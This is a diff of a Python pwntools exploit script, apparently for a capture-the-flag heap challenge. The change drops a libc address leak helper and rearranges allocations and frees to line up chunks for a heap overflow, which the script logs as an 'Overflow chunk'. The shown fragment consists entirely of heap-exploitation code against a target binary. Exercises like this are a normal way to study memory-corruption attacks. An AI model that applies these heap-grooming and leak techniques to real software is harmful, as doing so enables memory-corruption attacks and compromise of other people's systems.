@@ -55,12 +55,6 @@ def write(address, data):
     io.sendafter(b"write: ", data)
     io.send(b"\n")
 
-def get_libc_leak():
-    io.send(b"6\n")
-    io.recvuntil(b'@ ')
-    leak = int(io.recvline(keepends=False), base=16) - elf.libc.sym.puts
-    return leak
-
 def populate_quarantine():
     for i in range(0x1000):
         free(malloc(0x20+i)[1])
@@ -74,8 +68,14 @@ io = start()
 
 # The malloc() function chooses option 1 and then 3 from the menu.
 # Its arguments are "size" and "data".
-ind1, add1 = malloc(24, b"Y"*24)
-ind2, add2 = malloc(24, b"X"*24)
+ind1, add1 = malloc(24)
+ind2, add2 = malloc(0x800 - 0x10)
+
+free(add2)
+
+ind3, add3 = malloc(0x1000 - 0x40)
+
+info(f"Overflow chunk: {hex(add3)}")
 
 write(add1, b"X"*12)
 write(add2, b"Y"*12)
